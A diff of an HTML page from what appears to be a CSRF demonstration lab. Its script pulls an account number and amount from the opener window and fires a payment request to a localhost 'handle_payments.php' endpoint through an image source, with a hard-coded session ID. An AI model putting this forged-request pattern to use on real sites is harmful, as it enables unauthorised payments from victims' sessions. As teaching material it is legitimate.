@@ -4,15 +4,15 @@
 </head>
 <body>
 <div>
- <img src="https://static.pexels.com/photos/248797/pexels-photo-248797.jpeg" alt="Image" id="im"/> 
+ <img src="https://static.pexels.com/photos/248797/pexels-photo-248797.jpeg" alt="Image" id="im"/>
 </div>
 </body>
 <script>
    // alert("Hello");
    var doc = window.opener.document;
    var acc = doc.getElementById('acc_no2');
-   var amt = doc.getElementById('amt2');   
-   var link_rel = "http://localhost:81/CSRFDemonstration/Reflected/handle_payments.php?acc_no=" + acc + "&amount=" + amt + "&sessionID=bkq0amk4s451gmmfdd8tt02f70";
+   var amt = doc.getElementById('amt2');
+   var link_rel = "http://localhost:81/CSRFDemonstration/Reflected/handle_payments.php?acc_no=" + acc + "&amount=" + amt + "&sessionID=1agr58d5girdkng710959dh910";
    // alert("Hello");
    window.document.getElementById("im").src = link_rel;
    alert(window.document.getElementById("im").src);
